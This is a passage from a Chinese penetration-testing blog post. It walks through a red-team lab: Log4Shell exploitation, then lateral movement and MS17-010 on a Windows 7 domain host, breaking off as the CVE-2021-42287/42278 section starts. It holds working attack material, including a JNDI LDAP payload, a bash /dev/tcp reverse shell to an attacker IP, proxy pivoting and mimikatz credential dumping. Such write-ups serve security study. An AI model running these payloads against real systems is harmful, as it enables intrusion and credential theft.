---
title: 从外网 log4j2 RCE 再到内网组合拳漏洞 CVE-2021-42287、CVE-2021-42278 拿到 DC - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17150670.html
source: 博客园 - 渗透测试中心
date: 2023-02-25
fetch_date: 2025-10-04T08:04:35.885051
---

# 从外网 log4j2 RCE 再到内网组合拳漏洞 CVE-2021-42287、CVE-2021-42278 拿到 DC - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [从外网 log4j2 RCE 再到内网组合拳漏洞 CVE-2021-42287、CVE-2021-42278 拿到 DC](https://www.cnblogs.com/backlion/p/17150670.html "发布于 2023-02-24 11:25")

## 网络拓扑

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112439293-1629704471.png)](https://s2.loli.net/2022/03/26/pJkCEBD64MUlW2n.png)

## 信息搜集

渗透测试第一步当然是信息搜集

拿到 IP192.168.81.151我们先使用nmap对他进行常规TCP端口的扫描

```
nmap -v -Pn -T3 -sV -n -sT --open -p 22,1222,2222,22345,23,21,445,135,139,5985,2121,3389,13389,6379,4505,1433,3306,5000,5236,5900,5432,1521,1099,53,995,8140,993,465,878,7001,389,902,1194,1080,88,38080 192.168.81.151
```

发现开放了22,38080这两个端口

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112440302-161893427.png)](https://s2.loli.net/2022/03/26/cI4GZWYdyCXVw25.png)

通过nmap我们可以得知这是一台Ubuntu，22是ssh，而38080这个端口是unknown的，我们尝试访问一下

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112441015-1606254674.png)](https://s2.loli.net/2022/03/26/B9iafA5UQG6Mthu.png)

于是尝试最近爆出的新漏洞 CVE-2021-44228 尝试看看能不能获取到 dnslog

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112441754-989805708.png)](https://s2.loli.net/2022/03/26/kYWci9K2xJSf7bE.png)

发现存在 CVE-2021-44228漏洞，尝试去获取一个shell

## CVE-2021-44228 利用

首先在我们的VPS kali(192.168.81.133) 开启一个LDAP：

> git clone <https://github.com/black9/Log4shell_JNDIExploit.git>
>
> ```
> java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.81.133
> ```

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112442401-1799288793.png)](https://s2.loli.net/2022/03/26/NDBES56xkePFCs7.png)

然后在kali上nc监听9999端口：

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112443129-1120562669.png)](https://s2.loli.net/2022/03/26/i6KoDWz52ftr8SM.png)

我们使用TOMCATBYpass进行反弹shell

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112443857-1816671400.png)](https://s2.loli.net/2022/03/26/dMnfyU5EwiPIrzO.png)

/bin/bash -i >& /dev/tcp/192.168.210.23/9999 0>&1 -反弹shell

反弹shell命令需要进行base64编码

![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112444657-150046970.jpg)

BP抓包，改为post传参并且构造payload

> payload=${jndi:ldap://192.168.81.133:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjgxLjEzMy85OTk5IDA+JjE=}

最后使用EXP成功反弹shell，要对base64编码进行两次url编码才能执行

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112445349-1880270644.png)](https://s2.loli.net/2022/03/26/kZv46HpbXFYsDVK.png)

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112446035-2093462483.png)](https://s2.loli.net/2022/03/26/qFjSYmpkBZt4fPR.png)

发现当前拿到的shell是一个docker容器

想办法逃逸也失败了，最后在/root/目录下找到了flag文件：

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112446659-1582184670.png)](https://s2.loli.net/2022/03/26/VNcPrW9L2F18ED3.png)

```
flag{redteam.lab-1}

Congratulations, you got this: saul Saul123
```

得到了一个flag，还有一个类似于账号密码的东西

在信息收集中nmap扫到目标主机开放22ssh服务，因此思考可能是ssh的账号密码

## 内网信息搜集

通过上节得到的账号和密码登陆到了Ubuntu系统

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112447319-361521344.png)](https://s2.loli.net/2022/03/26/fLa4TD7G2ypnuFq.png)

我们可以看到当前机器拥有两块网卡，一块ens33用于链接外网，一块ens38用于内网通信

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112448090-1276995160.png)](https://s2.loli.net/2022/03/26/iDIokwam13ZJEGq.png)

> 在实战的内网渗透中：如果是在 linux 环境下的内网渗透尽量形成全部 bash 和 python 化，因为 Linux 都完全自带，而在 windows 下的内网渗透则尽量全部形成 powershell，bat、vbs 化，尽量不要过于依赖外部工具。

所以我们使用for循环ping一下ens38的c段网络

```
for i in 10.0.1.{1..254}; do if ping -c 3 -w 3 $i &>/dev/null; then echo $i Find the target; fi; done
```

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112449171-1244750120.png)](https://s2.loli.net/2022/03/26/njqNltUAGLKBPJW.png)

发现内网还有一台机器10.0.1.7存在

或者使用 scan info 工具进行内网信息收集

kali中使用python快速搭建httpd

![在这里插入图片描述](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112450004-1607023871.png)

靶机下载工具并赋予权限

![在这里插入图片描述](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112451176-676827144.png)

进行内网信息收集

![在这里插入图片描述](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112452147-2040438657.png)

发现10.0.1.7存活并存在MS17-010

随后为了方便，我选择用 frp 把当前机器的流量代理出来：

配置frps.ini

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112453151-2127359350.png)](https://s2.loli.net/2022/03/26/YVc2u6Dk8xZJfe4.png)

配置frpc.ini

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112453875-703136445.png)](https://s2.loli.net/2022/03/26/ByHCv2DpAsgaTiF.png)

然后使用 Metasploit 设置 Socks5 对内网进行深度信息搜集；

```
setg Proxies socks5:192.168.81.133:8888
setg ReverseAllowProxy true
```

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112454590-999174959.png)](https://s2.loli.net/2022/03/26/JybfN24HIuZxDKp.png)

使用 smb 版本探测模块对目标进行扫描：

```
use auxiliary/scanner/smb/smb_version
```

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112455381-1095096075.png)](https://s2.loli.net/2022/03/26/ruRjVQqIhZ9sfGb.png)

发现目标10.0.1.7版本是windows7，并且存在域REDTEAM

既然是windows7，那么就可能存在MS17-010漏洞

## MS17-010利用

通过上节，我们知道了10.0.1.7是win7，接下来进行探测

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112456243-449342750.png)](https://s2.loli.net/2022/03/26/RAbrUzl1kgOdpYN.png)

通过探测得知这台机器是存在ms17-010漏洞的

由于目标是内网不一定出网，故而tcp反射连接不能使用 设置为payload正向bind\_tcp

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112457059-1616668651.png)](https://s2.loli.net/2022/03/26/OzsaNtR6dG9Fyg4.png)

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112458087-1589219523.png)](https://s2.loli.net/2022/03/26/Eij13P7y8DBWHzK.png)

直接拿到win7权限，然后加载mimikataz把密码抓出来

```
Username   Domain   Password
 root     REDTEAM   Red12345
```

```
meterpreter > load mimikatz  加载工具

meterpreter > creds_all      列出凭证
注意命令是从内存中抓取密码，靶场原始状态为暂停恢复即可，如果重启过需要登录一次win7
```

![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112459386-400238020.png)

这个时候就得到了一个域用户的账号了。

## 内网利器 CVE-2021-42287、CVE-2021-42278

通过对当前内网的信息搜集之后发现，win7还有一块内网的网卡

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230224112500181-544535760...